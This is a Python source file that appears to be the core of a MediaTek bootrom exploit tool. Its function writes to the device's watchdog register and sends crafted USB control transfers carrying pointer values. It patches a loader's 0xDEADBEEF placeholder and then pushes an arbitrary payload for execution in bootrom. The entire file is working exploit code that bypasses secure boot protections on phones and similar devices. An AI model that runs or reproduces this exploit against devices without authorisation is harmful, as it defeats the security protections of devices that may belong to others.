from src.common import to_bytes, from_bytes
from serial.serialutil import SerialException

import usb
import array


def exploit(device, config, payload, loader):
    addr = config.watchdog_address + 0x50

    if not config.ptr_send:
        device.write32(addr, from_bytes(to_bytes(config.payload_address, 4), 4, '<'))
        if config.var_0:
            readl = config.var_0 + 0x4
            device.read32(addr - config.var_0, readl // 4)
        else:
            cnt = 15
            for i in range(cnt):
                device.read32(addr - (cnt - i) * 4, cnt - i + 1)

        device.echo(0xE0)

        device.echo(len(payload), 4)

        status = device.read(2)
        if from_bytes(status, 2) != 0:
            raise RuntimeError("status is {}".format(status.hex()))

        device.write(payload)

        # clear 4 bytes
        device.read(4)

    udev = usb.core.find(idVendor=0x0E8D, idProduct=0x3)

    try:
        # noinspection PyProtectedMember
        udev._ctx.managed_claim_interface = lambda *args, **kwargs: None
    except AttributeError as e:
        raise RuntimeError("libusb is not installed for port {}".format(device.dev.port)) from e

    try:
        if config.ptrs:
            buf = udev.ctrl_transfer(0xA1, 0x21, 0, 0, 7) + array.array('B', [0])
            for ptr in config.ptrs:
                udev.ctrl_transfer(0x21, 0x20, 0, 0, buf + array.array('B', to_bytes(ptr, 4, '<')))
                udev.ctrl_transfer(0x80, 0x6, 0x0200, 0, 9)

            if config.ptr_usbdl:
                loader = bytearray(loader)
                if from_bytes(loader[-4:], 4, '<') == 0xDEADBEEF:
                    loader[-4:] = to_bytes(config.ptr_usbdl, 4, '<')
                loader = bytes(loader)

            udev.ctrl_transfer(0x21, 0x20, 0, 0, array.array('B', loader))

        if not config.ptr_send:
            udev.ctrl_transfer(0xA1, 0, 0, config.var_1, 0)

    except usb.core.USBError as e:
        print(e)

    if config.ptr_send and config.ptr_target:
        device.echo(0x88)
        device.echo(0xC4)
        device.echo(0x08)
        device.echo(0x11)
        device.echo(0xA9)

        device.echo(config.ptr_send, 4)
        device.echo(4, 4)

        status = device.read(2)
        if from_bytes(status, 2) != 0:
            raise RuntimeError("status is {}".format(status.hex()))

        device.write(to_bytes(config.ptr_target, 4, '<'))

        result = device.read(4)
        if from_bytes(result, 4, '<') != config.ptr_usbdl:
            raise RuntimeError("Unexpected result {}".format(result.hex()))

        device.write(to_bytes(config.payload_address, 4, '<'))
        device.write(to_bytes(len(payload), 4, '<'))

        device.write(payload)

    # We don't need to wait long, if we succeeded
    # noinspection PyBroadException
    try:
        device.dev.timeout = 1
    except Exception:
        pass

    try:
        pattern = device.read(4)
    except SerialException as e:
        print(e)
        return False

    return pattern
